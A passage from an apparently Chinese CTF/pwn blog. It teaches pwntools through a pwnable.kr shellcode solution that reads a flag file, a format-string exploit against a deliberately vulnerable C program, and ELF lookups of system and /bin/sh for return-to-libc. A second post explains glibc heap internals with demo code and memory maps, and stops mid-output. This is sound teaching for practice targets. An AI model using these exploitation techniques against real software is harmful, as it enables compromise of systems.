<li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li>
<li><code>recvn(N)</code> 接受 N(数字) 字符</li>
<li><code>recvline()</code> 接收一行输出</li>
<li><code>recvlines(N)</code> 接收 N(数字) 行输出</li>
<li><code>recvuntil(some_string)</code> 接收到 some_string 为止<br>在第三行中,<code>p32()</code>可以让我们转换整数到小端序格式. <code>p32</code>转换4字节. <code>p64</code> 和 <code>p16</code> 则分别转换 8 bit 和 2 bit 数字. <code>c.sendline</code> 将我们的payload发送到远程主机. <code>&quot;AAAA&quot; * 14</code> 是我们到key的偏移量. Pwntools 不能自动运算偏移量，用户需要自行计算。<h2 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a>shellcode的编写</h2>下一题是pwnable.kr的asm. 你需要用 ssh -p2222 <a href="mailto:asm@pwnable.kr" target="_blank" rel="noopener">asm@pwnable.kr</a> 并输入密码 guest 来查看可执行文件和源码. 这里，我们只展示利用代码：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = process(&quot;./asm&quot;)</span><br><span class="line">context.log_level = &apos;DEBUG&apos;</span><br><span class="line">gdb.attach(p)</span><br><span class="line"> </span><br><span class="line">context(arch=&apos;amd64&apos;, os=&apos;linux&apos;)</span><br><span class="line"> </span><br><span class="line">shellcode = shellcraft.amd64.pushstr(&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;)</span><br><span class="line">shellcode += shellcraft.amd64.linux.open(&apos;rsp&apos;,0,0)</span><br><span class="line">shellcode += shellcraft.amd64.linux.read(&apos;rax&apos;,&apos;rsp&apos;,0)</span><br><span class="line">shellcode += shellcraft.amd64.linux.write(1, &apos;rsp&apos;, 100)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&apos;shellcode: &apos;)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">log.success(p.recvall())</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>我们这里用到了新的api: <code>process()</code>, <code>contex.log_level</code>, <code>gdb.attach</code>, 和 <code>shellcraft</code>.<br>提醒一下，如果你想在命令行中使用<code>gdb.attach()</code>, 便需要安装并运行 tmux.<br><code>process</code> 和 <code>remote</code> 类似. remote 连接远程主机, process 则通过你声明的二进制文件路径在本地创建新的进程. 除了 I/O, process 返回的对象可以通过 gdb.attach(p) 将进程attach到gdb上. Attach 之后, gdb 便可以调试该程序来 (设置 breakpoints, 查看 stack, 以及简单的反汇编).<br>shellcraft 是一个帮忙生成shellcode的类. 在我们的例子中, 我们 open 了一个文件并 read 文件到 stdout.</p>
<h2 id="格式化漏洞自动化"><a href="#格式化漏洞自动化" class="headerlink" title="格式化漏洞自动化"></a>格式化漏洞自动化</h2><p>我没有找到一个比较容易做的格式化漏洞题目，所以干脆用了官方文档的例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import tempfile</span><br><span class="line"> </span><br><span class="line">program = tempfile.mktemp()</span><br><span class="line">source  = program + &quot;.c&quot;</span><br><span class="line">write(source, &apos;&apos;&apos;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#define MEMORY_ADDRESS ((void*)0x11111000)</span><br><span class="line">#define MEMORY_SIZE 1024</span><br><span class="line">#define TARGET ((int *) 0x11111110)</span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">       char buff[1024];</span><br><span class="line">       void *ptr = NULL;</span><br><span class="line">       int *my_var = TARGET;</span><br><span class="line">       ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);</span><br><span class="line">       if(ptr != MEMORY_ADDRESS)</span><br><span class="line">       &#123;</span><br><span class="line">               perror(&quot;mmap&quot;);</span><br><span class="line">               return EXIT_FAILURE;</span><br><span class="line">       &#125;</span><br><span class="line">       *my_var = 0x41414141;</span><br><span class="line">       write(1, &amp;my_var, sizeof(int *));</span><br><span class="line">       scanf(&quot;%s&quot;, buff);</span><br><span class="line">       dprintf(2, buff);</span><br><span class="line">       write(1, my_var, sizeof(int));</span><br><span class="line">       return 0;</span><br><span class="line">&#125;&apos;&apos;&apos;)</span><br><span class="line">cmdline = [&quot;gcc&quot;, source, &quot;-Wno-format-security&quot;, &quot;-m32&quot;, &quot;-o&quot;, program]</span><br><span class="line">process(cmdline).wait_for_close()</span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">    p = process(program)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    return p.recvall()</span><br><span class="line"> </span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">offset = autofmt.offset</span><br><span class="line">p = process(program, stderr=PIPE)</span><br><span class="line">addr = u32(p.recv(4))</span><br><span class="line">payload = fmtstr_payload(offset, &#123;addr: 0x1337babe&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print hex(unpack(p.recv(4)))</span><br></pre></td></tr></table></figure>

<p>有了 <code>FmtStr</code>, 我们不用算偏移量算到疯. 我们需要先构造一个可以接收我们输入并返回格式化字符串输出的函数. 接着，我们可以得到 <code>autofmt</code>. 这个对象包含 <code>offset</code>, 即算好的偏移量. <code>fmtstr_payload(offset, {address: value})</code> 帮我们生成最后的payload. 第一个参数 <code>offset</code> 用 <code>autofmt.offset</code> 算好的即可. 然后, 我们需要声明 <code>{address: value}</code> 来覆盖address的内容成对应的value. 我们还可以同时改写多个地址:<code>{address1: value1, address2:value2,..., address: valueN}</code>.</p>
<p>有些情况不能自动生成payload. 以下文档介绍了如何手动生成payload .<br><a href="http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload" target="_blank" rel="noopener">http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload</a></p>
<h2 id="使用-ELF"><a href="#使用-ELF" class="headerlink" title="使用 ELF()"></a>使用 ELF()</h2><p>有些题目给了我们libc. 用 <code>gdb&gt; x function1 — function2</code> 算偏移量太麻烦了, 因此有了 <code>ELF</code>.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">e = ELF(&apos;./example_file&apos;)</span><br><span class="line">print hex(e.address)  # 0x400000</span><br><span class="line">print hex(e.symbols[&apos;write&apos;]) # 0x401680</span><br><span class="line">print hex(e.got[&apos;write&apos;]) # 0x60b070</span><br><span class="line">print hex(e.plt[&apos;write&apos;]) # 0x401680</span><br><span class="line">offset = e.symbols[&apos;system&apos;] - e.symbols[&apos;printf&apos;] # calculate offset</span><br><span class="line">binsh_address = next(e.search(&apos;/bin/sh\x00&apos;)) # find address which contains /bin/sh</span><br></pre></td></tr></table></figure>

<p>和 process() 一样, 我们只用将路径给 ELF(path) 即可分析 ELF.</p>
<p>我们有以下几种方法操纵ELF:</p>
<ul>
<li>symbols[‘a_function’] 找到 a_function 的地址</li>
<li>got[‘a_function’] 找到 a_function的 got</li>
<li>plt[‘a_function’] 找到 a_function 的 plt</li>
<li>next(e.search(“some_characters”)) 找到包含 some_characters（字符串，汇编代码或者某个数值）的地址.</li>
</ul>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>heap</title>
    <url>/2019/12/25/heap/</url>
    <content><![CDATA[<h1 id="pwn-heap"><a href="#pwn-heap" class="headerlink" title="pwn-heap"></a>pwn-heap</h1><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。我们一般称管理堆的那部分程序为堆管理器.</p>
<p>堆管理器处于用户程序与内核中间，主要做以下工作:</p>
<ul>
<li>响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。</li>
<li>管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</li>
</ul>
<p>目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。</p>
<p>需要注意的是，在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p>
<a id="more"></a>
<h2 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h2><p>这里我们主要介绍</p>
<ul>
<li>基本的堆操作，包括堆的分配，回收，堆分配背后的系统调用</li>
<li>介绍堆目前的多线程支持。<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3>在 glibc 的 malloc.c 中，malloc 的说明如下<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">  malloc(size_t n)</span><br><span class="line">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span><br><span class="line">  if no space is available. Additionally, on failure, errno is</span><br><span class="line">  set to ENOMEM on ANSI C systems.</span><br><span class="line">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span><br><span class="line">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span><br><span class="line">  systems.)  On most systems, size_t is an unsigned type, so calls</span><br><span class="line">  with negative arguments are interpreted as requests for huge amounts</span><br><span class="line">  of space, which will often fail. The maximum supported value of n</span><br><span class="line">  differs across systems, but is in all cases less than the maximum</span><br><span class="line">  representable value of a size_t.</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>可以看出，malloc 函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况进行了处理:</p>
<ul>
<li>当 n=0 时，返回当前系统允许的堆的最小内存块。</li>
<li>当 n 为负数时，由于在大多数系统上，size_t 是无符号数（这一点非常重要），所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3>在 glibc 的 malloc.c 中，free 的说明如下<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">      free(void* p)</span><br><span class="line">      Releases the chunk of memory pointed to by p, that had been previously</span><br><span class="line">      allocated using malloc or a related routine such as realloc.</span><br><span class="line">      It has no effect if p is null. It can have arbitrary (i.e., bad!)</span><br><span class="line">      effects if p has already been freed.</span><br><span class="line">      Unless disabled (using mallopt), freeing very large spaces will</span><br><span class="line">      when possible, automatically trigger operations that give</span><br><span class="line">      back unused memory to the system, thus reducing program footprint.</span><br><span class="line">    */</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>可以看出，free 函数会释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。</p>
<p>此外，该函数也同样对异常情况进行了处理:</p>
<ul>
<li>当 p 为空指针时，函数不执行任何操作。</li>
<li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 double free。</li>
<li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。<h2 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h2>在前面提到的函数中，无论是 malloc 函数还是 free 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数。这些函数背后的系统调用主要是 (s)brk 函数以及 mmap, munmap 函数。<h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk 的大小来向操作系统申请内存。</li>
</ul>
<p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同:</p>
<ul>
<li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。</li>
<li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* sbrk and brk example */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">        void *curr_brk, *tmp_brk = NULL;</span><br><span class="line"></span><br><span class="line">        printf(&quot;Welcome to sbrk example:%d\n&quot;, getpid());</span><br><span class="line"></span><br><span class="line">        /* sbrk(0) gives current program break location */</span><br><span class="line">        tmp_brk = curr_brk = sbrk(0);</span><br><span class="line">        printf(&quot;Program Break Location1:%p\n&quot;, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        /* brk(addr) increments/decrements program break location */</span><br><span class="line">        brk(curr_brk+4096);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(0);</span><br><span class="line">        printf(&quot;Program break Location2:%p\n&quot;, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(tmp_brk);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(0);</span><br><span class="line">        printf(&quot;Program Break Location3:%p\n&quot;, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>需要注意的是，在每一次执行完操作后，都执行了 getchar() 函数，这是为了我们方便我们查看程序真正的映射。</p>
<h3 id="在第一次调用-brk-之前"><a href="#在第一次调用-brk-之前" class="headerlink" title="在第一次调用 brk 之前"></a>在第一次调用 brk 之前</h3><p>从下面的输出可以看出，并没有出现堆。因此</p>
<ul>
<li>start_brk = brk = end_data = 0x804b000<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk</span><br><span class="line">Welcome to sbrk example:6141</span><br><span class="line">Program Break Location1:0x804b000</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps</span><br><span class="line">...</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539624     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="第一次增加-brk-后"><a href="#第一次增加-brk-后" class="headerlink" title="第一次增加 brk 后"></a>第一次增加 brk 后</h3><p>从下面的输出可以看出，已经出现了堆段</p>
<ul>
<li>start_brk = end_data = 0x804b000</li>
<li>brk = 0x804c000<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk</span><br><span class="line">Welcome to sbrk example:6141</span><br><span class="line">Program Break Location1:0x804b000</span><br><span class="line">Program Break Location2:0x804c000</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps</span><br><span class="line">...</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539624     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk</span><br><span class="line">0804b000-0804c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>其中，关于堆的那一行:</p>
<ul>
<li>0x0804b000 是相应堆的起始地址</li>
<li>rw-p 表明堆具有可读可写权限，并且属于隐私数据。</li>
<li>00000000 表明文件偏移，由于这部分内容并不是从文件中映射得到的，所以为 0。</li>
<li>00:00 是主从 (Major/mirror) 的设备号，这部分内容也不是从文件中映射得到的，所以也都为 0。</li>
<li>0 表示着 Inode 号。由于这部分内容并不是从文件中映射得到的，所以为 0。<h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2>malloc 会使用 mmap 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/* Private anonymous mapping example using mmap syscall */</span><br><span class="line">##include &lt;stdio.h&gt;</span><br><span class="line">##include &lt;sys/mman.h&gt;</span><br><span class="line">##include &lt;sys/types.h&gt;</span><br><span class="line">##include &lt;sys/stat.h&gt;</span><br><span class="line">##include &lt;fcntl.h&gt;</span><br><span class="line">##include &lt;unistd.h&gt;</span><br><span class="line">##include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void static inline errExit(const char* msg)</span><br><span class="line">&#123;</span><br><span class="line">        printf(&quot;%s failed. Exiting the process\n&quot;, msg);</span><br><span class="line">        exit(-1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">        int ret = -1;</span><br><span class="line">        printf(&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;, getpid());</span><br><span class="line">        printf(&quot;Before mmap\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        char* addr = NULL;</span><br><span class="line">        addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">        if (addr == MAP_FAILED)</span><br><span class="line">                errExit(&quot;mmap&quot;);</span><br><span class="line">        printf(&quot;After mmap\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        /* Unmap mapped region. */</span><br><span class="line">        ret = munmap(addr, (size_t)132*1024);</span><br><span class="line">        if(ret == -1)</span><br><span class="line">                errExit(&quot;munmap&quot;);</span><br><span class="line">        printf(&quot;After munmap\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="在执行-mmap-之前"><a href="#在执行-mmap-之前" class="headerlink" title="在执行 mmap 之前"></a>在执行 mmap 之前</h3><p>我们可以从下面的输出看到，目前只有. so 文件的 mmap 段。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>

<h3 id="mmap-后"><a href="#mmap-后" class="headerlink" title="mmap 后"></a>mmap 后</h3><p>从下面的输出可以看出，我们申请的内存与已经存在的内存段结合在了一起构成了 b7e00000 到 b7e21000 的 mmap 段。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e00000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>

<h3 id="munmap"><a href="#munmap" class="headerlink" title="munmap"></a>munmap</h3><p>从下面的输出，我们可以看到我们原来申请的内存段已经没有了，内存段又恢复了原来的样子了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>

<h2 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h2><p>在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆。</p>
<p>这里给出一个例子。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/* Per thread arena example. */</span><br><span class="line">##include &lt;stdio.h&gt;</span><br><span class="line">##include &lt;stdlib.h&gt;</span><br><span class="line">##include &lt;pthread.h&gt;</span><br><span class="line">##include &lt;unistd.h&gt;</span><br><span class="line">##include &lt;sys/types.h&gt;</span><br><span class="line"></span><br><span class="line">void* threadFunc(void* arg) &#123;</span><br><span class="line">        printf(&quot;Before malloc in thread 1\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        char* addr = (char*) malloc(1000);</span><br><span class="line">        printf(&quot;After malloc and before free in thread 1\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        free(addr);</span><br><span class="line">        printf(&quot;After free in thread 1\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">        pthread_t t1;</span><br><span class="line">        void* s;</span><br><span class="line">        int ret;</span><br><span class="line">        char* addr;</span><br><span class="line"></span><br><span class="line">        printf(&quot;Welcome to per thread arena example::%d\n&quot;,getpid());</span><br><span class="line">        printf(&quot;Before malloc in main thread\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        addr = (char*) malloc(1000);</span><br><span class="line">        printf(&quot;After malloc and before free in main thread\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        free(addr);</span><br><span class="line">        printf(&quot;After free in main thread\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        ret = pthread_create(&amp;t1, NULL, threadFunc, NULL);</span><br><span class="line">        if(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                printf(&quot;Thread creation error\n&quot;);</span><br><span class="line">                return -1;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = pthread_join(t1, &amp;s);</span><br><span class="line">        if(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                printf(&quot;Thread join error\n&quot;);</span><br><span class="line">                return -1;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一次申请之前， 没有任何任何堆段。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>

<p>第一次申请后， 从下面的输出可以看出，堆段被建立了，并且它就紧邻着数据段，这说明 malloc 的背后是用 brk 函数来实现的。同时，需要注意的是，我们虽然只是申请了 1000 个字节，但是我们却得到了 0x0806c000-0x0804b000=0x21000 个字节的堆。这说明虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。我们称这一块连续的内存区域为 arena。此外，我们称由主线程申请的内存为 main_arena。后续的申请的内存会一直从这个 arena 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>

<p>在主线程释放内存后，我们从下面的输出可以看出，其对应的 arena 并没有进行回收，而是交由 glibc 来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>

<p>在第一个线程 malloc 之前，我们可以看到并没有出现与线程 1 相关的堆，但是出现了与线程 1 相关的栈。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">Before malloc in thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0       